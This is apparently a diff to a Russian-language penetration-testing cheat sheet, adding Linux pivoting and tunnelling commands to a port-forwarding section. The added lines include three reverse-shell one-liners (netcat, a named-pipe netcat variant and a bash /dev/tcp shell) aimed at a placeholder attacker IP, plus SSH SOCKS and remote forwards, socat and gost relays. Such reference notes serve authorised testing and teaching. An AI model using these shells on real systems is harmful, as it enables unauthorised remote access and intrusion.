@@ -502,7 +502,14 @@ netsh interface portproxy show all
 Linux
 
 ```
-ssh -L 3336:db001.host:3306 user@pub001.host
+nc <attacker_ip> <port> -e /bin/bash
+mknod backpipe p; nc <attacker_ip> <port> 0<backpipe | /bin/bash 1>backpipe
+/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
+ssh -L 3336:db001.host:3306 user@pub001.host  (при подключении к SSH на узле 10.0.1.3 откроется публичный порт 10080)
+ssh -R 0.0.0.0:10080:127.0.0.1:80 user@10.0.1.3
+ssh -f -N -D 4444 user@<attacker_ip> (Опция -D в утилите SSH используется для создания динамического SOCKS-прокси на локальной машине. Когда вы используете опцию -D с SSH, SSH клиент подключается к удаленному хосту и на локальной машине открывается локальный SOCKS-прокси-сервер, который может быть использован для перенаправления трафика через зашифрованный туннель SSH на удаленном хосте.)
+socat TCP4-LISTEN:<lport>,fork TCP4:<target_ip>:<rport> &
+gost -L=:8080 || gost -L=socks://:1080
 ```
 ## Сбор информации
 
